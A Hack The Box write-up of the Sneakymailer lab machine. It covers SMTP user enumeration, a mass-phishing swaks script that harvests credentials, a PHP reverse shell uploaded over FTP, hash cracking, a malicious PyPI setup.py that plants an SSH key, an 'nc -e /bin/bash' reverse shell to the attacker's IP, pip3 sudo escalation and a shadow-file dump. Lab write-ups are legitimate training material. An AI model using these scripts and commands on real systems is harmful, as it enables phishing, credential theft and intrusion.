---
layout: single
title: Sneakymailer - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-07-29
classes: wide
header:
  teaser: /assets/images/htb-writeup-sneakymailer/sneakymailer_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-sneakymailer/sneakymailer_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@nidus:~# nmap -Pn -sC -sV -n 10.10.10.197
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-27 12:18 CEST
    Nmap scan report for 10.10.10.197
    Host is up (0.028s latency).
    Not shown: 993 closed ports
    PORT     STATE SERVICE  VERSION
    21/tcp   open  ftp      vsftpd 3.0.3
    22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    | ssh-hostkey:
    |   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
    |   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
    |_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
    25/tcp   open  smtp     Postfix smtpd
    |_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
    80/tcp   open  http     nginx 1.14.2
    |_http-server-header: nginx/1.14.2
    |_http-title: Did not follow redirect to http://sneakycorp.htb
    143/tcp  open  imap     Courier Imapd (released 2018)
    |_imap-capabilities: completed STARTTLS OK ACL UIDPLUS QUOTA IMAP4rev1 CAPABILITY ENABLE UTF8=ACCEPTA0001 SORT ACL2=UNION THREAD=REFERENCES CHILDREN THREAD=ORDEREDSUBJECT IDLE NAMESPACE
    | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
    | Subject Alternative Name: email:postmaster@example.com
    | Not valid before: 2020-05-14T17:14:21
    |_Not valid after:  2021-05-14T17:14:21
    |_ssl-date: TLS randomness does not represent time
    993/tcp  open  ssl/imap Courier Imapd (released 2018)
    |_imap-capabilities: completed AUTH=PLAIN OK ACL UIDPLUS QUOTA IMAP4rev1 CAPABILITY ENABLE UTF8=ACCEPTA0001 SORT ACL2=UNION THREAD=REFERENCES CHILDREN THREAD=ORDEREDSUBJECT IDLE NAMESPACE
    | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
    | Subject Alternative Name: email:postmaster@example.com
    | Not valid before: 2020-05-14T17:14:21
    |_Not valid after:  2021-05-14T17:14:21
    |_ssl-date: TLS randomness does not represent time
    8080/tcp open  http     nginx 1.14.2
    |_http-open-proxy: Proxy might be redirecting requests
    |_http-server-header: nginx/1.14.2
    |_http-title: Welcome to nginx!
    Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


    DIRB:
    + http://sneakycorp.htb/index.php (CODE:200|SIZE:13543)


    NIKTO:
    -


2. From the initial nmap scan we can see that port 80 redirects us to http://sneakycorp.htb - add sneakycorp.htb to /etc/hosts.
   Port 80 gives us a list of all employees of the company, along with title and email. Other then that it says 'Please check your emails
   for further instructions and register an account' - rabbit hole?
   Looking at the ports it's quiet obvious that you should enumerate the mail server to find users or any other valuable information.

   Using cewl I create a wordlist and then start to fish for valid users via metasploit smtp_enum module.

   root@nidus:/git/htb/sneakymailer# cewl -w sneaky-list.txt -d 4 http://sneakycorp.htb

   msf5 auxiliary(scanner/smtp/smtp_enum) > set user_file /git/htb/sneakymailer/sneaky-list.txt
   msf5 auxiliary(scanner/smtp/smtp_enum) > set verbose true
   msf5 auxiliary(scanner/smtp/smtp_enum) > run

     [*] 10.10.10.197:25       - 10.10.10.197:25 Banner: 220 debian ESMTP Postfix (Debian/GNU)
     [*] 10.10.10.197:25       - 10.10.10.197:25 Domain Name: debian
     ..
     [*] 10.10.10.197:25       - 10.10.10.197:25 - Found user: Developer
     [*] 10.10.10.197:25       - 10.10.10.197:25 - Found user: PyPI
     [*] 10.10.10.197:25       - 10.10.10.197:25 - Found user: List
     ..
     [+] 10.10.10.197:25       - 10.10.10.197:25 Users found: Developer, List, PyPI, pypi
     [*] 10.10.10.197:25       - Scanned 1 of 1 hosts (100% complete)

    Using ffuf we find sneakycorp.htb/pypi/register.php
      root@nidus:/git/htb/sneakymailer# ffuf -c -w sneaky-list.txt -u http://sneakycorp.htb/pypi/FUZZ.php

          /'___\  /'___\           /'___\
         /\ \__/ /\ \__/  __  __  /\ \__/
         \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
          \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
           \ \_\   \ \_\  \ \____/  \ \_\
            \/_/    \/_/   \/___/    \/_/

         v1.1.0-git
      ________________________________________________

        :: Method           : GET
        :: URL              : http://sneakycorp.htb/pypi/FUZZ.php
        :: Wordlist         : FUZZ: sneaky-list.txt
        :: Follow redirects : false
        :: Calibration      : false
        :: Timeout          : 10
        :: Threads          : 40
        :: Matcher          : Response status: 200,204,301,302,307,401,403
      ________________________________________________

      register                [Status: 200, Size: 3115, Words: 730, Lines: 82]
      :: Progress: [370/370] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

    Here I got stuck for a good while. I tried to connect to the FTP with known users but with no luck. Looking at the HTB forums gave
    a hint that you (probably) need to phish to get any further. Compile a list of all employees email accounts.

    root@nidus:/git/htb/sneakymailer# curl http://sneakycorp.htb/team.php | grep @sneakymailer.htb > email-raw.txt

    Sort the data:

    root@nidus:/git/htb/sneakymailer# awk -v RS="[><]" '/@/' email-raw.txt  > email.txt


3. You can execute your phishing attack with or without a local SMTP server. For educational purpose I did both, which took a lot of
   time and caused some headache. With a local SMTP server you can verify the status of your emails through /var/log/mail.log which
   might make it easier if you're stuck with formating etc - however remote SMTP server is far faster.

   a) Local SMTP Server
      - Install postfix and mailutils
          root@nidus:/git/htb/sneakymailer# apt install mailutils
          root@nidus:/git/htb/sneakymailer# apt install postfix
            When asked about the environment, select ‘Internet Site’. When asked to confirm the hostname, select default "localhost.localdomain"

      - Configure postfix with domain, network, interface, protocol, delimiter and DNS
          root@nidus:/git/htb/sneakymailer# postconf -e "mydestination = $myhostname, nidus, localhost.localdomain, localhost"
          root@nidus:/git/htb/sneakymailer# postconf -e "mynetworks = 127.0.0.0/8, 10.10.14.0/24"
          root@nidus:/git/htb/sneakymailer# postconf -e "inet_interfaces = all"
          root@nidus:/git/htb/sneakymailer# postconf -e "inet_protocols = ipv4"
          root@nidus:/git/htb/sneakymailer# postconf -e "recipient_delimiter = +"
          root@nidus:/git/htb/sneakymailer# postconf -e "lmtp_host_lookup = native"
          root@nidus:/git/htb/sneakymailer# postconf -e "smtp_host_lookup = native"

      - Restart postfix for all changes to take place, and test to send a email via telnet.
          TELNET)
            root@nidus:/git/htb/sneakymailer# service postfix restart
            root@nidus:/git/htb/sneakymailer# telnet localhost 25
                220 nidus ESMTP Postfix (Debian/GNU)
              ehlo localhost
              mail from: root@localhost
              rcpt to: zoritaserrano@sneakymailer.htb
              data
              Subject: Test mail.
              Test Body.
              .
              quit

      - Verify that the email was sent, indicated by 'status=sent'
          root@nidus:/git/htb/sneakymailer# cat /var/log/mail.log
            Jul 28 18:05:03 nidus postfix/smtpd[175559]: 342481A40360: client=localhost[127.0.0.1]
            Jul 28 18:05:19 nidus postfix/cleanup[175649]: 342481A40360: message-id=<20200728160503.342481A40360@nidus>
            Jul 28 18:05:19 nidus postfix/qmgr[162551]: 342481A40360: from=<root@localhost>, size=329, nrcpt=1 (queue active)
            Jul 28 18:05:20 nidus postfix/smtpd[175559]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
            Jul 28 18:05:29 nidus postfix/smtp[175653]: 342481A40360: to=<zoritaserrano@sneakymailer.htb>, relay=sneakymailer.htb[10.10.10.197]:25, delay=33, delays=22/0.02/10/0.09, dsn=2.0.0, status=sent (250 2.0.0 Ok: queued as 4A6DF24ADD)
            Jul 28 18:05:29 nidus postfix/qmgr[162551]: 342481A40360: removed


   b) Using Victim SMTP Server
      - Execute swaks and point to their server directly.
          root@nidus:/git/htb/sneakymailer# swaks --to sulcud@sneakymailer.htb --from it-dep@sneakymailer.htb --header "Subject: Test" --body "This is a test." --server 10.10.10.197;
            === Trying 10.10.10.197:25...
            === Connected to 10.10.10.197.
            ..
            -> MAIL FROM:<it-dep@sneakymailer.htb>
            <-  250 2.1.0 Ok
            -> RCPT TO:<sulcud@sneakymailer.htb>
            <-  250 2.1.5 Ok
            -> DATA
            <-  354 End data with <CR><LF>.<CR><LF>
            -> Date: Tue, 28 Jul 2020 18:14:08 +0200
            -> To: sulcud@sneakymailer.htb
            -> From: it-dep@sneakymailer.htb
            -> Subject: Test
            -> Message-Id: <20200728181408.175962@nidus>
            -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
            ->
            -> This is a test.
            ->
            ->
            -> .
            <-  250 2.0.0 Ok: queued as 4F5DE24ADF
            -> QUIT
            <-  221 2.0.0 Bye
            === Connection closed with remote host.


4. When you are able to send emails it's time to weaponize your phishing scheme. In this attack we will include a http-link to our
   IP address, hoping to grab some sensitive data when the victim clicks it. To make it effective we need to make a script to loop
   through all the employees email addresses.

   I've made two different scripts, one when using your own SMTP server and the other when using the victims.
   NOTE: Before executing the script(s), setup a nc listener on port 80 to capture anyone clicking the link!

   a) Local SMTP Server - for loop:
        root@nidus:/git/htb/sneakymailer# cat for-phish.sh
          #!/bin/bash
          for i in $(cat email.txt); do
              swaks --to $i --from bill.gates@microsoft.com --header "Subject: Click the link!" --body "http://10.10.14.4" --server 10.10.14.4 --port 25
          done

   b) Using Victim SMTP Server - while loop:
        root@nidus:/git/htb/sneakymailer# cat while-phish.sh
          #!/bin/bash
          inputFile=$1

          while read mail;
          do
             swaks --to $mail --from it-dep@sneakymailer.htb --header "Subject: Security Audit" --body "You need to log into http://10.10.14.4/ to confirm your account." --server 10.10.10.197;
          done < $inputFile


5. Running the scripts gives us a reply from Paul Byrd, including a url encoded password. Decode the password and start to hunt
   for places it can be used. Looking at the POST it seem to be directed to the register form on http://sneakycorp.htb/pypi/register.php

    root@nidus:/opt/setoolkit# nc -lvnp 80
      listening on [any] 80 ...
      connect to [10.10.14.4] from (UNKNOWN) [10.10.10.197] 57254
      POST /%20to%20confirm%20your%20account. HTTP/1.1
      Host: 10.10.14.4
      User-Agent: python-requests/2.23.0
      Accept-Encoding: gzip, deflate
      Accept: */*
      Connection: keep-alive
      Content-Length: 185
      Content-Type: application/x-www-form-urlencoded

      firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt

    root@nidus:/git/htb/sneakymailer# hURL -u "%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt"
      Original    :: %5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
      URL DEcoded :: ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht

    Creds: paulbyrd@sneakymailer.htb:^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht


6. Download and install the email client thunderbird. Upon first start enter the following:

    Your name: Paul Byrd
    Email Address: paulbyrd@sneakymailer.htb
    Password: ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht

    Press 'Continue'. It will fail to find the server, change to following:
      INCOMING
        Protocol: IMAP
        Server Hostname: sneakymailer.htb
        Port: 143
        SSL: None
        Authentication: Normal Password

      OUTGOING
        Protocol: SMTP
        Server Hostname: sneakymailer.htb
        Port: 25
        SSL: None
        Authentication: Normal Password

    Press 'Done', check 'I understand the risks' and then 'Done'. Restart thunderbird and you'll be connected to Paul Byrd's email.
    After successfully logging in to Paul's email account we find a message in his "Sent Items"-folder.

      "Hello administrator, I want to change this password for the developer account

      Username: developer
      Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C

      Please notify me when you do it"

    The credentials developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C work for the FTP server, inside we have the folder dev which within we
    have write permissions.

    ftp> ls -l
      200 PORT command successful. Consider using PASV.
      150 Here comes the directory listing.
      drwxrwxr-x    8 0        1001         4096 Jul 28 13:32 dev

    We are able to put a shell here however we can't reach it - maybe because it's another owner? We need to think rethink.
    ftp> ls -l
      200 PORT command successful. Consider using PASV.
      150 Here comes the directory listing.
      drwxr-xr-x    2 0        0            4096 May 26 19:52 css
      drwxr-xr-x    2 0        0            4096 May 26 19:52 img
      -rwxr-xr-x    1 0        0           13742 Jun 23 09:44 index.php
      drwxr-xr-x    3 0        0            4096 May 26 19:52 js
      drwxr-xr-x    2 0        0            4096 May 26 19:52 pypi
      -rwxrwxrwx    1 1001     1001         5492 Jul 28 13:49 rev.php


7. At this point I got a bit frustrated, but then started to think about the name of the box and company - SNEAKY.. Maybe we didn't
   find everything in the enumeration so I decided to fuzz for subdomains, and voila(!) dev.sneakycorp.htb.

   root@nidus:/git/htb/sneakymailer# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://sneakycorp.htb -H "Host:FUZZ.sneakycorp.htb" -fc 301

              /'___\  /'___\           /'___\
             /\ \__/ /\ \__/  __  __  /\ \__/
             \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
               \ \_\   \ \_\  \ \____/  \ \_\
                \/_/    \/_/   \/___/    \/_/

             v1.1.0-git
      ________________________________________________

       :: Method           : GET
       :: URL              : http://sneakycorp.htb
       :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
       :: Header           : Host: FUZZ.sneakycorp.htb
       :: Follow redirects : false
       :: Calibration      : false
       :: Timeout          : 10
       :: Threads          : 40
       :: Matcher          : Response status: 200,204,301,302,307,401,403
       :: Filter           : Response status: 301
      ________________________________________________

      dev                     [Status: 200, Size: 13737, Words: 4007, Lines: 341]
      :: Progress: [20469/20469] :: Job [1/1] :: 1279 req/sec :: Duration: [0:00:16] :: Errors: 0 ::

   Add dev.sneakycorp.htb to /etc/hosts. Upload your reverse shell through FTP and trigger it http://dev.sneakycorp.htb/rev.php

     root@nidus:/git/htb/sneakymailer# nc -lvnp 4488
       listening on [any] 4488 ...
       connect to [10.10.14.4] from (UNKNOWN) [10.10.10.197] 47296
       Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
        14:08:35 up  8:42,  0 users,  load average: 0.00, 0.03, 0.00
       USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
       uid=33(www-data) gid=33(www-data) groups=33(www-data)
       /bin/sh: 0: can't access tty; job control turned off
       $ whoami
       www-data


8. Upgrade your shell. Looking around in the box we find another subdomain in /var/www - pypi.sneakycorp.htb. In the directory
   we find .htpasswd, containing a set of credentials. Crack them and add the subdomain to /etc/hosts.

    www-data@sneakymailer:~/pypi.sneakycorp.htb$ cat .htpasswd
      pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/

    root@nidus:/git/htb/sneakymailer# hashcat -a0 -m1600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt --force
      ..
      Session..........: hashcat
      Status...........: Cracked

    root@nidus:/git/htb/sneakymailer# cat cracked.txt
      $apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui

    You reach the subdomain on port 8080 - http://pypi.sneakycorp.htb


9. On the pypi subdomain we are able to login with out new found credentials. Here we are able to install python packages to be run
   on the victim server. Looking for packages I found none that would grant me reverse access to the victim, so instead I started to look on
   how to create your own custom package. Follow the guidelines on linode.com (linked below) to create your files.

    www-data@sneakymailer:/dev/shm$ mkdir p3pkg
    www-data@sneakymailer:/dev/shm$ cd p3pkg
    www-data@sneakymailer:/dev/shm/p3pkg$ touch README.md setup.cfg setup.py

    www-data@sneakymailer:/dev/shm/p3pkg$ mkdir p3pkg
    www-data@sneakymailer:/dev/shm/p3pkg$ cd p3pkg/
    www-data@sneakymailer:/dev/shm/p3pkg/p3pkg$ touch __init.py__

    www-data@sneakymailer:/dev/shm/p3pkg$ tree
      .
      ├── p3pkg
      │   └── __init.py__
      ├── README.md
      ├── setup.cfg
      └── setup.py

    INFORMATION ABOUT EACH FILE
    - Setup.py:
      .. contains information about your package that PyPi needs, like its name, a description, the current version etc.
    - Setup.cfg:
      .. contains metadata. If you have a description file (and you definitely should!), you can specify it here.
    - README.md
      .. installation guidelines, dependencies etc. Best practice to use when publishing to public PyPI repo.
    - __init.py__:
      .. is used to mark which classes you want the user to access through the package interface. This is where you enter your code.

   You should now have code in all files except the README-file. For a easy proof of concept I copy pasted the example "Hello World"
   init-file to be uploaded before making a malicious package.

     www-data@sneakymailer:/dev/shm/p3pkg$ cat setup.cfg
      [metadata]
      description-file = README.md

     www-data@sneakymailer:/dev/shm/p3pkg$ cat setup.py
      from setuptools import setup

      setup(
        name='p3.Hello',
        packages=['p3pkg'],
        description='Give me user please.',
        version='0.1',
        author='PlayerThree',
        author_email='PlayerThree@htb.eu',
        keywords=['p3','privesc']
        )

   Compress the package and you'll find your .tar.gz-file in the dist directory.

   www-data@sneakymailer:/dev/shm/p3pkg$ python3 setup.py sdist
     running sdist
     running egg_info
     creating p3.Hello.egg-info
     writing p3.Hello.egg-info/PKG-INFO
     writing dependency_links to p3.Hello.egg-info/dependency_links.txt
     writing top-level names to p3.Hello.egg-info/top_level.txt
     writing manifest file 'p3.Hello.egg-info/SOURCES.txt'
     package init file 'p3pkg/__init__.py' not found (or not a regular file)
     reading manifest file 'p3.Hello.egg-info/SOURCES.txt'
     writing manifest file 'p3.Hello.egg-info/SOURCES.txt'
     running check
     warning: check: missing required meta-data: url

     creating p3.Hello-0.1
     creating p3.Hello-0.1/p3.Hello.egg-info
     copying files to p3.Hello-0.1...
     copying README.md -> p3.Hello-0.1
     copying setup.cfg -> p3.Hello-0.1
     copying setup.py -> p3.Hello-0.1
     copying p3.Hello.egg-info/PKG-INFO -> p3.Hello-0.1/p3.Hello.egg-info
     copying p3.Hello.egg-info/SOURCES.txt -> p3.Hello-0.1/p3.Hello.egg-info
     copying p3.Hello.egg-info/dependency_links.txt -> p3.Hello-0.1/p3.Hello.egg-info
     copying p3.Hello.egg-info/top_level.txt -> p3.Hello-0.1/p3.Hello.egg-info
     Writing p3.Hello-0.1/setup.cfg
     creating dist
     Creating tar archive
     removing 'p3.Hello-0.1' (and everything under it)

   www-data@sneakymailer:/dev/shm/p3pkg$ ls dist/
     p3.Hello-0.1.tar.gz

   Now when we have our package created, we need to upload it. We do this in two (2) steps:

    1) Create a .pypirc-file in our home directory, containing information pointing towards our new repository. However we don't have
       write permissions in home, so we need to change the environment variable of home to another folder to do this.

       www-data@sneakymailer:~$ touch .pypirc
        touch: cannot touch '.pypirc': Permission denied

       www-data@sneakymailer:~$ cd /dev/shm/p3pkg
       www-data@sneakymailer:/dev/shm/p3pkg$ export HOME=/dev/shm/p3pkg
       www-data@sneakymailer:~$ touch .pypirc
       www-data@sneakymailer:~$ cat .pypirc
         [distutils]
         index-servers =
           pypi
           p3pkg
         [pypi]
         username:
         password:
         [p3pkg]
         repository: http://127.0.0.1:8080
         username: pypi
         password: soufianeelhaoui

   2) Upload the package. If successful you'll get message 'Server Response (200): OK'.

        www-data@sneakymailer:~$ python3 setup.py sdist upload -r p3pkg
          ..
          Submitting dist/p3.Hello-0.1.tar.gz to http://127.0.0.1:8080
          Server response (200): OK


10. My first thought here was to inject a reverse shell into the setup.py file. This worked great however I was still user www-data.
    Rethinking this and I noticed we have read in /home/low/.ssh/authorized_keys, I'll try to inject my public key there!

      > NOTE: After reviewing writeup's upon completion of this box I noticed it is possible to get a reverse shell directly from
      >      setup.py. To do this you add the following code (user low has uid 1000):
      >        import os
      >        if os.getuid() == 1000:
      >              os.system('nc -e /bin/bash 10.10.14.4 4499')

    www-data@sneakymailer:/dev/shm$ mkdir sshpy
    www-data@sneakymailer:/dev/shm$ cd sshpy/
    www-data@sneakymailer:/dev/shm/sshpy$ touch README.md setup.cfg setup.py
    www-data@sneakymailer:/dev/shm/sshpy$ mkdir sshpy
    www-data@sneakymailer:/dev/shm/sshpy$ touch sshpy/__init.py__
    www-data@sneakymailer:/dev/shm/sshpy$ touch .pypirc

    Locally create a new SSH-key for low
      root@nidus:/git/htb/sneakymailer# ssh-keygen
        Generating public/private rsa key pair.
        Enter file in which to save the key (/root/.ssh/id_rsa): /git/htb/sneakymailer/low-id_rsa
        Enter passphrase (empty for no passphrase): <BLANK>
        Enter same passphrase again: <BLANK>

    Create your malicious Python code in 'setup.py'.
      www-data@sneakymailer:/dev/shm/sshpy$ cat setup.py
        from setuptools import setup
        try:
            print('Injecting SSH Key to : /home/low/.ssh/authorized_keys')
            with open ('/home/low/.ssh/authorized_keys', 'w+') as f:
                f.writelines('ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7gfXdak0OBbpzYk2K1VoGzsusV0WoVahv7wNc7H8dUaUm2gZwo8jB9ZI6bWAnbYiweLD2SJUmbPEYPwqx5LLKhf2binQv1MppDYGX21CGR7t6e/BD46DSIOnEiF/PZ3wIOvM9Ks+9WxFuZTMSbAUB03knO5b4Ux9IMOAE5Oyb4ju3NQIJrQkEYDzYDiSzgNCzio2dIZLTnjXXG+4KrNEimjKmd3I7O4Qd5MS2Le1hIIylrwv96CraJxbDWL+gGglzy5XMJrVwNefyUfSENNSSdXGBnmoOm7lHy3dWR/6b8LNN9FZaE/c9wFMhcyPgwlBNNilRjZ/9R3kCRNayxrSHe1kbUMt94dLEFrR2sOdiusZbxiBRWqnt13LApE184rWbmDer8zAUNqaOWcyeAib7nCP33jCgUHeDmHSmG6fba+2lYYBo/7nGxLAs9Rpkh0H9Iq6E3Bb4Suvyy3XcRqeSfAtBznjkjKK4NlT+B7zS6QpgXLoetHDRn8LFkSmR3M0=')

        except:
            setup(
                name='sshpy',
                packages=['sshpy'],
                description='SSH Key Injection',
                version='1.0',
                author='PlayerThree',
                author_email='dontemail@me.com',
                keywords=['p3','ssh']
                )

      Compress it, export sshpy as new home directory, and upload the package.
        www-data@sneakymailer:/dev/shm/sshpy$ python3 setup.py sdist
        www-data@sneakymailer:/dev/shm/sshpy$ export HOME=/dev/shm/sshpy
        www-data@sneakymailer:~$ python3 setup.py sdist upload -r sshpy

      Verifying that the key was injected.
        www-data@sneakymailer:~$ cat /home/low/.ssh/authorized_keys
          ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7gfXdak0OBbpzYk2K1VoGzsusV0WoVahv7wNc7H8dUaUm2gZwo8jB9ZI6bWAnbYiweLD2SJUmbPEYPwqx5LLKhf2binQv1MppDYGX21CGR7t6e/BD46DSIOnEiF/PZ3wIOvM9Ks+9WxFuZTMSbAUB03knO5b4Ux9IMOAE5Oyb4ju3NQIJrQkEYDzYDiSzgNCzio2dIZLTnjXXG+4KrNEimjKmd3I7O4Qd5MS2Le1hIIylrwv96CraJxbDWL+gGglzy5XMJrVwNefyUfSENNSSdXGBnmoOm7lHy3dWR/6b8LNN9FZaE/c9wFMhcyPgwlBNNilRjZ/9R3kCRNayxrSHe1kbUMt94dLEFrR2sOdiusZbxiBRWqnt13LApE184rWbmDer8zAUNqaOWcyeAib7nCP33jCgUHeDmHSmG6fba+2lYYBo/7nGxLAs9Rpkh0H9Iq6E3Bb4Suvyy3XcRqeSfAtBznjkjKK4NlT+B7zS6QpgXLoetHDRn8LFkSmR3M0=


11. Login with private key and grab user.txt

      root@nidus:/git/htb/sneakymailer# ssh low@10.10.10.197 -i low-id_rsa
      low@sneakymailer:~$ cat user.txt
        94eda5f834eda70421b0acf1d926de0c


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. No explanation needed, GTFOBins shows you the way.

    low@sneakymailer:~$ sudo -l
      sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
      Matching Defaults entries for low on sneakymailer:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

      User low may run the following commands on sneakymailer:
        (root) NOPASSWD: /usr/bin/pip3

    low@sneakymailer:~$ TF=$(mktemp -d)
    low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
    low@sneakymailer:~$ sudo pip3 install $TF

    # bash
    root@sneakymailer:/tmp/pip-req-build-9k8kjhct# whoami
      root
    root@sneakymailer:/tmp/pip-req-build-9k8kjhct# cat /root/root.txt
      2899da30ac9b64d50fa82b79e5b1e3eb


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

Phishing, own SMTP server:
  https://docs.gitlab.com/ee/administration/reply_by_email_postfix_setup.html
  https://docs.gitlab.com/ee/administration/reply_by_email_postfix_setup.html#configure-postfix-to-receive-email-from-the-internet
  https://serverfault.com/questions/972270/subject-status-bounced-host-or-domain-name-not-found-name-service-error-for-n
  https://userlinux.net/postfix-resolving-etchosts-entries.html

Phishing, victim SMTP server:
  https://www.sefnet.tech/2016/09/28/how-to-send-mail-from-command-line-using-swaks/

PyPI Server Remote Upload:
  https://pypi.org/project/pypiserver/#uploading-packages-remotely

Create Custom PyPI Package:
  https://www.linode.com/docs/applications/project-management/how-to-create-a-private-python-package-repository/
  https://medium.com/@joel.barmettler/how-to-upload-your-python-package-to-pypi-65edc5fe9c56

EvilPy PyPI Reverse Shell:
  https://github.com/sn0wfa11/evil_py

Python Reading and Writing Files:
  https://docs.python.org/3/tutorial/inputoutput.html#reading-and-writing-files

Data Dumps:
  root@sneakymailer:~# cat /etc/shadow
    root:$6$jJW2Iy0Knfw7c6gr$/p2MAEhr7Fy4bMIT8szzgnSkL2kp8EaPKvGQ//cfcX0bMnazYHzNwWIsGaGwgceFyftI2Xihj0rrhUbfkrzhf.:18402:0:99999:7:::
    low:$6$uJyxhtAXNReh6EXv$usBZZbzaXxYPjjcna4uV2qm7Zcm/tpjYxpKLZFotswl3jxwV9nFr9B8GzO9efkqNrYzuhfOcesiiiD8rZiIyb0:18402:0:99999:7:::
    developer:$6$QwehzS3JhUi8Ms7a$Z3bKmOwCHk6LGgcw6DtuV.Cxr90hfH945xQZrLBsaWCNxmRhFV/GWSDD9eLhpDcOYq4oD5yu6ZbF/KjNb215e.:18397:0:99999:7:::
